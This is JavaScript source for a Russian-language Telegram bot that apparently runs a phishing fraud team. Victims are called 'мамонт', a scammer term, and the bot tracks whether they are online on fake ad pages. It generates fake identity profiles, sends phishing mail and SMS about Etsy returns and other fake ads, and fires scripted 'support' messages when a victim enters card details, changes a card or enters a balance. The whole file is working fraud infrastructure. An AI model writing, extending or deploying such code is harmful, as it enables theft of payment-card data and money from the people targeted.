      await ctx
        .editMessageReplyMarkup(
          Markup.inlineKeyboard([
            [Markup.callbackButton(`🔴 Оффлайн`, `operator_status_off`)],
            [Markup.callbackButton("👨‍🎓 Воркеры", "operator_students")],
            [
              Markup.callbackButton(
                "💯 Установить процент ",
                "set1_operator_percent"
              ),
              Markup.callbackButton(
                "📄 Установить анкету",
                "set1_operator_about"
              ),
            ],
            [Markup.callbackButton("◀️ Назад", "start")],
          ])
        )
        .catch((err) => err);
    }
  } catch (err) {
    console.log(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("supports", supports);

bot.action(/^check_mamont_(\w+)$/, async (ctx) => {
  try {
    const adId = ctx.match[1];

    if (!adId) {
      return ctx.answerCbQuery("❌ Ошибка: ID объявления отсутствует.", true);
    }

    // Проверяем наличие подключения в памяти (clients Map)
    const isOnline = clients.has(adId);
    let message;

    if (isOnline) {
      message = "🟢 Мамонт онлайн";
    } else {
      // Если нет в памяти, обращаемся к базе данных за последним посещением
      const ad = await Ad.findByPk(adId);

      if (!ad || !ad.lastSeen) {
        message = "🔴 Мамонт не был замечен на сайте";
      } else {
        const timeAgo = getTimeAgo(ad.lastSeen);
        message = `🔴 Был в сети: ${timeAgo}`;
      }
    }

    await ctx.answerCbQuery(message, true);
  } catch (err) {
    console.error("Ошибка при проверке мамонта:", err);
    await ctx.answerCbQuery("❌ Ошибка: не удалось проверить.", true);
  }
});

// Вспомогательная функция определения времени последнего посещения
function getTimeAgo(lastSeen) {
  const diffMs = new Date() - new Date(lastSeen);
  if (diffMs < 60000) return `${Math.floor(diffMs / 1000)} сек. назад`;
  if (diffMs < 3600000) return `${Math.floor(diffMs / 60000)} мин. назад`;
  if (diffMs < 86400000) return `${Math.floor(diffMs / 3600000)} ч. назад`;
  return `${Math.floor(diffMs / 86400000)} дн. назад`;
}
bot.action("delete_admin_ads", async (ctx) => {
  try {
    await Ad.destroy({
      where: {},
      truncate: true,
    });
    await ctx
      .answerCbQuery("🗑️ Все объявления были удалены")
      .catch((err) => err);
    return ads(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("operator_status", async (ctx) => {
  try {
    const user = await User.findOne({ where: { id: ctx.from.id } });

    // Check if user has an operator assigned
    if (!user.operator) {
      // Send a message if no operator is assigned
      return ctx.answerCbQuery("❌ У вас нет назначенного оператора.", true);
    }

    const operator = await Operators.findOne({
      where: { userId: user.operator },
    });

    function formatOfflineTime(timestamp) {
      const localDate = new Date(timestamp);
      const ukraineOffset = 120; // UTC+2
      const correctedDate = new Date(
        localDate.getTime() + ukraineOffset * 60000
      );
      return correctedDate.toISOString().slice(0, 16).replace("T", " ");
    }

    ctx.answerCbQuery(
      operator.work
        ? `✅ Оператор онлайн`
        : `❌ Оператор оффлайн. Последний раз был в сети ${formatOfflineTime(
          operator.updatedAt
        )}. (по Киеву)`,
      true
    );
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("supportTemp", (ctx) => supportTemps(ctx, 1));
bot.action(/^support_templates_(\d+)$/, (ctx) => {
  const page = parseInt(ctx.match[1]);
  return require('./commands/supportTemp')(ctx, page);
});


bot.action("add_temp", async (ctx) => {
  return ctx.scene.enter("add_temp");
});
bot.action(/^temp_(\d+)$/, async (ctx) => {
  try {
    const temp = await SupportTemp.findOne({ where: { id: ctx.match[1] } });
    if (!temp) return ctx.reply("❌ Шаблон не найден.");

    let countryTitle = "";
    if (temp.countryId) {
      const country = await Country.findOne({ where: { id: temp.countryId } });
      if (country) countryTitle = ` (${country.title})`;
    }

    await ctx.answerCbQuery("📋 Получаю шаблон...").catch(() => {});

    return ctx.replyOrEdit(
      `📋 Шаблон: <b>${temp.title}${countryTitle}</b>\n\n${
        temp.text == null
          ? `🖼️ Изображение: <b>${temp.photo}</b>`
          : `💬 Текст: <b>${temp.text}</b>`
      }`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("🏷 Изменить название", `change_title_temp_${ctx.match[1]}`)],
          [Markup.callbackButton("✏️ Изменить содержимое", `change_text_temp_${ctx.match[1]}`)],
          [Markup.callbackButton("🌍 Изменить страну", `change_country_temp_${ctx.match[1]}`)],
          [Markup.callbackButton("❌ Удалить шаблон", `delete_temp_${ctx.match[1]}`)],
          [Markup.callbackButton("◀️ Назад", "supportTemp")],
        ]),
      }
    );
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Произошла ошибка!").catch(() => {});
  }
});

bot.action(/^change_country_temp_(\d+)$/, async (ctx) => {
  try {
    const tempId = ctx.match[1];

const countries = await Country.findAll({
      where: { status: 1 }, // ❗️ только активные страны
      order: [["id", "asc"]],
    });

    const global = countries.find((c) => c.id === "eu");
    const filtered = countries.filter((c) => c.id !== "eu");

    const buttons = chunk(
      filtered.map((c) => Markup.callbackButton(c.title, `set_country_temp_${tempId}_${c.id}`)),
      3
    );

    if (global) buttons.push([Markup.callbackButton(global.title, `set_country_temp_${tempId}_${global.id}`)]);
    buttons.push([Markup.callbackButton("◀️ Назад", `temp_${tempId}`)]);

    await ctx.replyOrEdit("🌍 Выберите новую страну для шаблона:", {
      reply_markup: Markup.inlineKeyboard(buttons),
    });
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка при выборе страны").catch(() => {});
  }
});
bot.action(/^set_country_temp_(\d+)_(\w+)$/, async (ctx) => {
  try {
    const tempId = ctx.match[1];
    const countryId = ctx.match[2];

    const temp = await SupportTemp.findOne({ where: { id: tempId } });
    if (!temp) return ctx.reply("❌ Шаблон не найден.");

    const country = await Country.findOne({ where: { id: countryId } });
    if (!country) return ctx.reply("❌ Страна не найдена.");

    await temp.update({ countryId });

    await ctx.answerCbQuery(`✅ Страна изменена на ${country.title}.`);
    
    return bot.handleUpdate({
      callback_query: {
        ...ctx.update.callback_query,
        data: `temp_${tempId}`,
        message: ctx.update.callback_query.message,
        from: ctx.update.callback_query.from,
      },
    });
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка при смене страны").catch(() => {});
  }
});
bot.action("export_templates", async (ctx) => {
  try {
    const supportTemps = await SupportTemp.findAll({
      where: { userId: ctx.from.id },
    });

    if (!supportTemps || supportTemps.length === 0) {
      return ctx.answerCbQuery("📭 У тебя пока нет шаблонов.", true);
    }

    let output = "";

    supportTemps.forEach((temp) => {
      const content = temp.text || temp.photo || "";
      const country = temp.countryId || ""; // может быть пустым
      output += `${temp.title} | ${content} | ${country}\n`;
    });

    const buffer = Buffer.from(output, "utf-8");
    const fileName = `templates_${ctx.from.id}.txt`;

    await ctx.replyWithDocument({
      source: buffer,
      filename: fileName,
    });

    return ctx.answerCbQuery("📤 Шаблоны выгружены!", true);
  } catch (error) {
    console.error("❌ Ошибка при выгрузке шаблонов:", error);
    return ctx.reply("❌ Не удалось выгрузить шаблоны.");
  }
});

bot.action("import_templates", async (ctx) => {
  await ctx.answerCbQuery();
  return ctx.scene.enter("importTemplates");
});
bot.action(/^support_sendTemp_(\d+)_(\d+)_(\d+)$/, async (ctx) => {
  try {
    const supportId = Number(ctx.match[1]); // Преобразуем в число
    const userId = Number(ctx.match[2]); // ID воркера
    const tempId = Number(ctx.match[3]); // ID шаблона
    const callerId = Number(ctx.from.id); // ID того, кто нажал кнопку

    // Получаем данные воркера по userId
    const worker = await User.findOne({ where: { id: userId } });
    if (!worker) {
      return ctx.answerCbQuery("❌ Пользователь не найден", true);
    }

    if (callerId === userId) {
      // Если вызывает сам воркер – проверяем, что у него нет оператора
      if (worker.operator) {
        return ctx.answerCbQuery("❌ Для этого у тебя есть оператор", true);
      }
    } else {
      // Если вызывает оператор, то проверяем, что именно этот оператор закреплен за воркером
      if (Number(worker.operator) !== callerId) {
        return ctx.answerCbQuery(
          "❌ Вы не являетесь оператором этого воркера",
          true
        );
      }
    }

    return ctx.scene.enter("support_sendTemp", {
      supportId,
      userId,
      tempId,
    });
  } catch (err) {
    console.log(err);
    return ctx.answerCbQuery("❌ Ошибка", true);
  }
});

bot.action("auto_tp", (ctx) => autoTp(ctx, 1));

// Обработчик для переключения страниц
bot.action(/^auto_tp_page_(\d+)$/, (ctx) => {
  const page = parseInt(ctx.match[1]);
  return autoTp(ctx, page);
});
bot.action(/^auto_(\d+)$/, async (ctx) => {
  try {
    const auto = await AutoTp.findOne({ where: { id: ctx.match[1] } });

    if (!auto) {
      return ctx.reply("❌ Шаблон не найден").catch((err) => err);
    }

    const country = await Country.findOne({ where: { id: auto.countryId } });

    await ctx.answerCbQuery("Получаю шаблон...").catch((err) => err);

    return ctx.replyOrEdit(
      `🤖 Шаблон: <b>${auto.title} ${country?.title ? `(${country.title})` : ' (Не указана)'}</b>

💬 Текст: <b>${auto.text}</b>

⚙️ Статус: ${auto.status == 0
        ? `<b>отключён</b>`
        : `отправка при <b>${auto.status == 1
          ? `переходе`
          : auto.status == 2
            ? `PUSH`
            : auto.status == 3
              ? `SMS`
              : auto.status == 4
                ? `ожидании`
                : auto.status == 5
                  ? `переходе на ввод карты`
                  : auto.status == 6
                    ? `смене карты`
                    : `вводе баланса`
        }</b>`
      }`,

      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton("🔗 Переход", `select_auto_${ctx.match[1]}`),
            Markup.callbackButton("📱 PUSH", `select_auto_push_${ctx.match[1]}`)
          ],
          [
            Markup.callbackButton("💬 SMS", `select_auto_sms_${ctx.match[1]}`),
            Markup.callbackButton("⏳ Ожидание", `select_auto_wait_${ctx.match[1]}`)
          ],
          [
            Markup.callbackButton("💳 Ввод карты", `select_auto_card_${ctx.match[1]}`),
            Markup.callbackButton("🔄 Смена карты", `select_auto_othercard_${ctx.match[1]}`)
          ],
          [
            Markup.callbackButton("💰 Ввод баланса", `select_auto_balance_${ctx.match[1]}`)
          ],
          [
            Markup.callbackButton("🌍 Изменить страну", `change_country_${ctx.match[1]}`)
          ],
          ...(auto.status !== 0
            ? [
              [
                Markup.callbackButton(
                  "🚫 Отключить отправку",
                  `delete_selecte_auto_${ctx.match[1]}`
                )
              ]
            ]
            : []),
          [
            Markup.callbackButton("❌ Удалить шаблон", `delete_auto_${ctx.match[1]}`)
          ],
          [
            Markup.callbackButton("◀️ Назад", "auto_tp")
          ]
        ])
      }
    );
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action(/^change_country_(\d+)$/, async (ctx) => {
  try {
    const autoId = ctx.match[1];

    const countries = await Country.findAll({
      where: { status: 1 },
      order: [["id", "asc"]],
    });

    // Отделим "Всемирные"
    const globalCountry = countries.find((c) => c.id === "eu");
    const filteredCountries = countries.filter((c) => c.id !== "eu");

    // Кнопки обычных стран
    const mainButtons = chunk(
      filteredCountries.map((country) =>
        Markup.callbackButton(
          country.title,
          `set_country_${autoId}_${country.id}`
        )
      ),
      3
    );

    // Кнопка "Всемирная"
    const globalButtonRow = globalCountry
      ? [[
        Markup.callbackButton(
          globalCountry.title,
          `set_country_${autoId}_${globalCountry.id}`
        )
      ]]
      : [];

    // Кнопки "Назад" и "Отменить" в одном ряду
    const navButtons = [[
      Markup.callbackButton("◀️ Назад", `auto_${autoId}`),
    ]];

    await ctx.replyOrEdit("🌍 Выберите новую страну для шаблона:", {
      reply_markup: Markup.inlineKeyboard([
        ...mainButtons,
        ...globalButtonRow,
        ...navButtons
      ]),
    });
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка при выборе страны").catch((err) => err);
  }
});
// Установка новой страны для шаблона
bot.action(/^set_country_(\d+)_(\w+)$/, async (ctx) => {
  try {
    const autoId = ctx.match[1];
    const countryId = ctx.match[2];

    const auto = await AutoTp.findOne({ where: { id: autoId } });

    if (!auto) {
      return ctx.reply("❌ Шаблон не найден").catch((err) => err);
    }

    await auto.update({ countryId });

    const country = await Country.findOne({ where: { id: countryId } });

    await ctx.answerCbQuery(
      `✅ Страна для шаблона ${auto.title} успешно изменена на ${country.title}.`,
      {
        parse_mode: "HTML",
      }
    );

    // Возвращаем пользователя обратно к шаблону
    // вручную вызываем обработчик auto_<id>
    return bot.handleUpdate({
      callback_query: {
        ...ctx.update.callback_query,
        data: `auto_${ctx.match[1]}`,
        message: ctx.update.callback_query.message,
        from: ctx.update.callback_query.from,
      },
    });
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка при смене страны").catch((err) => err);
  }
});
bot.action(/^select_auto_(\d+)$/, async (ctx) => {
  try {
    await AutoTp.update(
      {
        status: true,
        position: true,
      },
      {
        where: {
          id: ctx.match[1],
        },
      }
    );
    await ctx
      .answerCbQuery("🔗 Шаблон успешно установлен при переходе ")
      .catch((err) => err);

    // вручную вызываем обработчик auto_<id>
    return bot.handleUpdate({
      callback_query: {
        ...ctx.update.callback_query,
        data: `auto_${ctx.match[1]}`,
        message: ctx.update.callback_query.message,
        from: ctx.update.callback_query.from,
      },
    });
  } catch (err) {
    console.log(err)
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^select_auto_push_(\d+)$/, async (ctx) => {
  try {
    await AutoTp.update(
      {
        status: 2,
      },
      {
        where: {
          id: ctx.match[1],
        },
      }
    );
    await ctx
      .answerCbQuery("📱 Шаблон успешно установлен при ПУШЕ ")
      .catch((err) => err);

    // вручную вызываем обработчик auto_<id>
    return bot.handleUpdate({
      callback_query: {
        ...ctx.update.callback_query,
        data: `auto_${ctx.match[1]}`,
        message: ctx.update.callback_query.message,
        from: ctx.update.callback_query.from,
      },
    });
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^select_auto_card_(\d+)$/, async (ctx) => {
  try {
    await AutoTp.update(
      {
        status: 5,
      },
      {
        where: {
          id: ctx.match[1],
        },
      }
    );
    await ctx
      .answerCbQuery("💳 Шаблон успешно установлен при ВВОДЕ КАРТЫ ")
      .catch((err) => err);

    // вручную вызываем обработчик auto_<id>
    return bot.handleUpdate({
      callback_query: {
        ...ctx.update.callback_query,
        data: `auto_${ctx.match[1]}`,
        message: ctx.update.callback_query.message,
        from: ctx.update.callback_query.from,
      },
    });
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action(/^select_auto_othercard_(\d+)$/, async (ctx) => {
  try {
    await AutoTp.update(
      {
        status: 6,
      },
      {
        where: {
          id: ctx.match[1],
        },
      }
    );
    await ctx
      .answerCbQuery("🔄 Шаблон успешно установлен при СМЕНЕ КАРТЫ ")
      .catch((err) => err);

    // вручную вызываем обработчик auto_<id>
    return bot.handleUpdate({
      callback_query: {
        ...ctx.update.callback_query,
        data: `auto_${ctx.match[1]}`,
        message: ctx.update.callback_query.message,
        from: ctx.update.callback_query.from,
      },
    });
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^select_auto_sms_(\d+)$/, async (ctx) => {
  try {
    await AutoTp.update(
      {
        status: 3,
      },
      {
        where: {
          id: ctx.match[1],
        },
      }
    );
    await ctx
      .answerCbQuery("💬 Шаблон успешно установлен при СМС ")
      .catch((err) => err);

    // вручную вызываем обработчик auto_<id>
    return bot.handleUpdate({
      callback_query: {
        ...ctx.update.callback_query,
        data: `auto_${ctx.match[1]}`,
        message: ctx.update.callback_query.message,
        from: ctx.update.callback_query.from,
      },
    });
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^select_auto_wait_(\d+)$/, async (ctx) => {
  try {
    await AutoTp.update(
      {
        status: 4,
      },
      {
        where: {
          id: ctx.match[1],
        },
      }
    );
    await ctx
      .answerCbQuery("⏳ Шаблон успешно установлен при ОЖИДАНИИ ")
      .catch((err) => err);

    // вручную вызываем обработчик auto_<id>
    return bot.handleUpdate({
      callback_query: {
        ...ctx.update.callback_query,
        data: `auto_${ctx.match[1]}`,
        message: ctx.update.callback_query.message,
        from: ctx.update.callback_query.from,
      },
    });
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action(/^select_auto_balance_(\d+)$/, async (ctx) => {
  try {
    await AutoTp.update(
      {
        status: 7,
      },
      {
        where: {
          id: ctx.match[1],
        },
      }
    );
    await ctx
      .answerCbQuery("💰 Шаблон успешно установлен при ВВОДЕ БАЛАНСА ")
      .catch((err) => err);

    // вручную вызываем обработчик auto_<id>
    return bot.handleUpdate({
      callback_query: {
        ...ctx.update.callback_query,
        data: `auto_${ctx.match[1]}`,
        message: ctx.update.callback_query.message,
        from: ctx.update.callback_query.from,
      },
    });
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action(/^delete_selecte_auto_(\d+)$/, async (ctx) => {
  try {
    const id = ctx.match[1];

    const auto = await AutoTp.findOne({ where: { id } });
    if (!auto) {
      return ctx.reply("❌ Шаблон не найден").catch((err) => err);
    }

    if (auto.status == 0) {
      await ctx.answerCbQuery("Шаблон уже отключён", true).catch((err) => err);
    } else {
      await auto.update({ status: 0 });
      await ctx.answerCbQuery("🚫 Шаблон успешно отключён").catch((err) => err);
    }

    // вручную вызываем обработчик auto_<id>
    return bot.handleUpdate({
      callback_query: {
        ...ctx.update.callback_query,
        data: `auto_${id}`,
        message: ctx.update.callback_query.message,
        from: ctx.update.callback_query.from,
      },
    });
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});


bot.action(/^delete_user_operator_(\d+)$/, async (ctx) => {
  try {
    await User.update(
      {
        operator: null,
      },
      {
        where: {
          id: ctx.match[1],
        },
      }
    );
    await ctx
      .answerCbQuery("✅ Оператор успешно удален ", true)
      .catch((err) => err);
    return user(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^delete_request_user_operator_(\d+)$/, async (ctx) => {
  try {
    await User.update(
      {
        requestOperator: 0,
      },
      {
        where: {
          id: ctx.match[1],
        },
      }
    );
    await ctx
      .answerCbQuery("✅ Заявка успешно обнулена", true)
      .catch((err) => err);
    return user(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^delete_request_user_teachers_(\d+)$/, async (ctx) => {
  try {
    await User.update(
      {
        requestMentor: 0,
      },
      {
        where: {
          id: ctx.match[1],
        },
      }
    );
    await ctx
      .answerCbQuery("✅ Заявка успешно обнулена", true)
      .catch((err) => err);
    return user(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^delete_user_teachers_(\d+)$/, async (ctx) => {
  try {
    await User.update(
      {
        mentor: null,
      },
      {
        where: {
          id: ctx.match[1],
        },
      }
    );
    await ctx
      .answerCbQuery("✅ Наставник успешно удален ", true)
      .catch((err) => err);
    return user(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action("add_auto", async (ctx) => {
  return ctx.scene.enter("addAuto");
});
bot.action(/^delete_auto_(\d+)$/, async (ctx) => {
  try {
    await AutoTp.destroy({ where: { id: ctx.match[1] } });
    await ctx
      .answerCbQuery("✅ Шаблон успешно удален", true)
      .catch((err) => err);

    return require("./commands/autoTp")(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action("delete_all_my_auto", async (ctx) => {
  try {
    await AutoTp.destroy({
      where: {
        userId: ctx.from.id,
      },
    }); // await ctx.answerCbQuery("Удаляю профиль! ").catch((err) => err);
    await ctx.answerCbQuery("🗑️ Все ваши авто-шаблоны были удалены");

    return require("./commands/autoTp")(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^tempSupport_(\d+)_(\d+)$/, async (ctx) => {
  try {
    const supportId = ctx.match[1];
    const targetUserId = ctx.match[2];
    const callerId = ctx.from.id;

    const worker = await User.findOne({ where: { id: targetUserId } });
    if (!worker) {
      return ctx.answerCbQuery("❌ Пользователь не найден", true);
    }

    if (callerId === worker.id) {
      if (worker.operator) return ctx.answerCbQuery("❌ Для этого у вас есть оператор", true);
      if (worker.smartsupp) return ctx.answerCbQuery("❌ Для этого у вас есть Smartsupp", true);
    } else {
      if (Number(worker.operator) !== Number(callerId)) {
        return ctx.answerCbQuery("❌ Вы не являетесь оператором этого воркера", true);
      }
    }

    // Определяем страну
    const support = await Support.findOne({
      where: { id: supportId },
      include: [{ association: "ad", include: [{ association: "service" }] }],
    });

    if (!support || !support.ad || !support.ad.service) {
      return ctx.answerCbQuery("❌ Не удалось определить страну", true);
    }

    let countryId = support.ad.service.countryCode || null;
    if (countryId === "com") countryId = "eu";

    // Сначала проверяем — есть ли вообще шаблоны у пользователя
    const totalTemplates = await SupportTemp.count({ where: { userId: callerId } });

    if (totalTemplates === 0) {
      return ctx.answerCbQuery("У вас пока нет ни одного шаблона", true);
    }

    // Затем фильтруем по стране
    const filteredTemplates = await SupportTemp.findAll({
      where: {
        userId: callerId,
        [Sequelize.Op.or]: [
          { countryId },
          { countryId: null },
        ],
      },
    });

    if (filteredTemplates.length === 0) {
      return ctx.answerCbQuery("❌ У вас нет шаблонов для этой страны", true);
    }

    const buttons = filteredTemplates.map((v) =>
      Markup.callbackButton(
        `${v.title}`,
        `support_sendTemp_${supportId}_${targetUserId}_${v.id}`
      )
    );

    await ctx.replyWithHTML("📋 Выберите шаблон:", {
      reply_to_message_id: ctx.update.callback_query.message.message_id,
      reply_markup: Markup.inlineKeyboard([
        ...chunk(buttons, 2),
        [Markup.callbackButton("Отменить", "delete")],
      ]),
    });
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => console.log(err));
  }
});

bot.action(/^delete_temp_(\d+)$/, async (ctx) => {
  try {
    await SupportTemp.destroy({ where: { id: ctx.match[1] } });
    await ctx
      .answerCbQuery("✅ Шаблон успешно удален! ", true)
      .catch((err) => err);

    return require("./commands/supportTemp")(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action("delete_smartsupp", async (ctx) => {
  try {
    await User.update(
      {
        smartsupp: null,
      },
      {
        where: {
          id: ctx.from.id,
        },
      }
    );
    // await ctx.answerCbQuery("Удаляю профиль! ").catch((err) => err);
    await ctx.answerCbQuery("🗑️ Токен успешно удален! ").catch((err) => err);

    return require("./commands/format_tp")(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("delete_all_my_profiles", async (ctx) => {
  try {
    await Profiles.destroy({
      where: {
        userId: ctx.from.id,
      },
    }); // await ctx.answerCbQuery("Удаляю профиль! ").catch((err) => err);
    await ctx.answerCbQuery("🗑️ Все ваши профили были удалены");

    return require("./commands/profiles")(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("delete_all_my_temp", async (ctx) => {
  try {
    await SupportTemp.destroy({
      where: {
        userId: ctx.from.id,
      },
    }); // await ctx.answerCbQuery("Удаляю профиль! ").catch((err) => err);
    await ctx.answerCbQuery("🗑️ Все ваши шаблоны были удалены");

    return require("./commands/supportTemp")(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action(/^profile_(\d+)$/, async (ctx) => {
  try {
    const profiles = await Profiles.findOne({ where: { id: ctx.match[1] } });
    await ctx.answerCbQuery("Получаю профиль! ").catch((err) => err);
    return ctx.replyOrEdit(
      `👤 Профиль: <b>${profiles.title}</b>

📰 ФИО: <b>${profiles.name}</b>   
🏡 Адрес: <b>${profiles.address}</b>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(
              "💬 Изменить название профиля",
              `change_title_${ctx.match[1]}`
            ),
          ],

          [
            Markup.callbackButton(
              "📰 Изменить ФИО",
              `change_fio_${ctx.match[1]}`
            ),
            Markup.callbackButton(
              "🏡 Изменить адрес",
              `change_address_${ctx.match[1]}`
            ),
          ],

          [
            Markup.callbackButton(
              "❌ Удалить профиль",
              `delete_profile_${ctx.match[1]}`
            ),
          ],
          [Markup.callbackButton("◀️ Назад", "profiles")],
        ]),
      }
    );
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^delete_profile_(\d+)$/, async (ctx) => {
  try {
    await Profiles.destroy({ where: { id: ctx.match[1] } });
    // await ctx.answerCbQuery("Удаляю профиль! ").catch((err) => err);
    await ctx.answerCbQuery("🗑️ Профиль успешно удален! ").catch((err) => err);

    return require("./commands/profiles")(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("generate_profile_createlink", async (ctx) => {
  const rows = Object.entries(supportedCountries).map(([code, data]) =>
    Markup.callbackButton(`${data.emoji}`, `generate2_${code}`)
  );

  // Разбить на строки по 4 кнопки
  const keyboard = [];
  while (rows.length) keyboard.push(rows.splice(0, 4));

  keyboard.push([Markup.callbackButton("◀️ Назад", "profiles")]);

  await ctx.editMessageText("🌍 Выберите страну для генерации профиля:", {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard(keyboard),
  });
});
// Показ кнопок выбора страны
bot.action("generate_profile", async (ctx) => {
  const rows = Object.entries(supportedCountries).map(([code, data]) =>
    Markup.callbackButton(`${data.emoji}`, `generate_${code}`)
  );

  // Разбить на строки по 4 кнопки
  const keyboard = [];
  while (rows.length) keyboard.push(rows.splice(0, 4));

  keyboard.push([Markup.callbackButton("◀️ Назад", "profiles")]);

  await ctx.editMessageText("🌍 Выберите страну для генерации профиля:", {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard(keyboard),
  });
});

// Генерация и сохранение профиля
bot.action(/^generate_(.+)$/, async (ctx) => {
  const code = ctx.match[1];
  const userId = ctx.from.id;

  try {
    const profile = generateFakeProfile(code);

    await Profiles.create({
      userId,
      title: profile.title,
      name: profile.name,
      address: profile.address,
    });

    await ctx.editMessageText(
      `✅ Профиль создан!\n\n👤 <b>${profile.name}</b>\n🏡 ${profile.address}`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("🔁 Сгенерировать ещё", "generate_profile")],
          [Markup.callbackButton("◀️ Назад к профилям", "profiles")],
        ]),
      }
    );
  } catch (error) {
    console.error(error);
    await ctx.reply("❌ Ошибка при генерации профиля.");
  }
});

bot.action(/^generate2_(.+)$/, async (ctx) => {
  const code = ctx.match[1];
  const userId = ctx.from.id;

  try {
    const profile = generateFakeProfile(code);

    await Profiles.create({
      userId,
      title: profile.title,
      name: profile.name,
      address: profile.address,
    });

    await ctx.editMessageText(
      `✅ Профиль создан!\n\n👤 <b>${profile.name}</b>\n🏡 ${profile.address}`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("🔗 Создать объявление", "create_link")],

          [
            Markup.callbackButton(
              "🔁 Сгенерировать ещё",
              `generate_profile_createlink`
            ),
          ],
          [Markup.callbackButton("◀️ Назад к профилям", "profiles")],
        ]),
      }
    );
  } catch (error) {
    console.error(error);
    await ctx.reply("❌ Ошибка при генерации профиля.");
  }
});
bot.action("add_profile", async (ctx) => {
  return ctx.scene.enter("add_profile");
});

bot.action("add_profile2", async (ctx) => {
  return ctx.scene.enter("add_profile2");
});

bot.action("profiles", (ctx) => profiles(ctx, 1));
bot.action(/^profiles_page_(\d+)$/, (ctx) => {
  const page = parseInt(ctx.match[1]);
  return profiles(ctx, page);
});


bot.action(/^set_(mentor|operator)_(percent|about)$/, async (ctx) => {
  return ctx.scene.enter("mentor_settings");
});

bot.action(/^set1_(operator)_(percent|about)$/, async (ctx) => {
  return ctx.scene.enter("operator_settings");
});



bot.action(/^return_etsy_(\d+)$/, async (ctx) => {
  const adId = ctx.match[1];

  ctx.scene.state.etsy = adId;

  return ctx.scene.enter("return_etsy");
});
bot.action(/^return_service_(\d+)$/, async (ctx) => {
  const adId = ctx.match[1];

  ctx.scene.state.etsy = adId;

  return ctx.scene.enter("return_service");
});
bot.action(/^sendMail_(\w+)$/, (ctx) =>
  ctx.scene.enter("sendMailAd", {
    adId: ctx.match[1],
  })
);
bot.action(/^sendMail2_(\w+)$/, (ctx) =>
  ctx.scene.enter("sendMailAd2", {
    adId: ctx.match[1],
  })
);
bot.action(/^sendMail3_(\w+)$/, (ctx) =>
  ctx.scene.enter("sendMailAd3", {
    adId: ctx.match[1],
  })
);
bot.action(/^sendMail4_(\w+)$/, (ctx) =>
  ctx.scene.enter("sendMailAd4", {
    adId: ctx.match[1],
  })
);
bot.action(/^sendMail5_(\w+)$/, (ctx) =>
  ctx.scene.enter("sendMailAd5", {
    adId: ctx.match[1],
  })
);

bot.action(/^sendMail6_(\w+)$/, (ctx) =>
  ctx.scene.enter("sendMailAd6", {
    adId: ctx.match[1],
  })
);
bot.action(/^sendMail7_(\w+)$/, (ctx) =>
  ctx.scene.enter("sendMailAd7", {
    adId: ctx.match[1],
  })
);
bot.action(/^sendMail8_(\w+)$/, (ctx) =>
  ctx.scene.enter("sendMailAd8", {
    adId: ctx.match[1],
  })
);
bot.action(/^sendMail9_(\w+)$/, (ctx) =>
  ctx.scene.enter("sendMailAd9", {
    adId: ctx.match[1],
  })
);


bot.action(/^sendSms_(\w+)$/, (ctx) =>
  ctx.scene.enter("sendAdSms", {
    adId: ctx.match[1],
  })
);

bot.action(/^sendSms2_(\w+)$/, (ctx) =>
  ctx.scene.enter("sendAdSms2", {
    adId: ctx.match[1],
  })
);
bot.action(/^sendSms3_(\w+)$/, (ctx) =>
  ctx.scene.enter("sendAdSms3", {
    adId: ctx.match[1],
  })
);
bot.action(/^screen_(\w+)$/, (ctx) =>
  ctx.scene.enter("screenshot", {
    adId: ctx.match[1],
  })
